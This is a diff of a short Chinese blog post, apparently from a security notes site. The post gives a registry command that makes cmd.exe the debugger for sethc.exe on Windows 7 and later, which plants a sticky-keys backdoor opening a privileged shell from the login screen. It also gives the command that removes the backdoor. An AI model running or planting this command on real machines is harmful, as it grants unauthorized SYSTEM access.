@@ -113,11 +113,17 @@
 
         
 
-        <span itemprop="articleBody"><p>以管理员身份打开cmd.exe运行如下:</p>
+        <span itemprop="articleBody"><h3 id="about">About</h3>
 
-<p>’’’
-REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe” /v Debugger /t REG_SZ /d “C:\windows\system32\cmd.exe”
-‘’’</p>
+<p>win03下copy命令可制作粘滞键后门,测试在win7上copy方法无效,本文记录win7下的方法</p>
+
+<h3 id="detail">Detail</h3>
+
+<p>以管理员身份打开cmd.exe运行如下:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
+</code></pre>
+</div>
 
 <table>
   <tbody>
@@ -132,9 +138,9 @@ REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executio
 
 <p>删除后门以管理员身份打开cmd.exe运行如下即可:</p>
 
-<p>’’’
-REG DELETE “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe”
-‘’’</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+</code></pre>
+</div>
 
 <p>以上理论上适用于win vistar以上系统,只在win7上测试过.</p>
 </span>
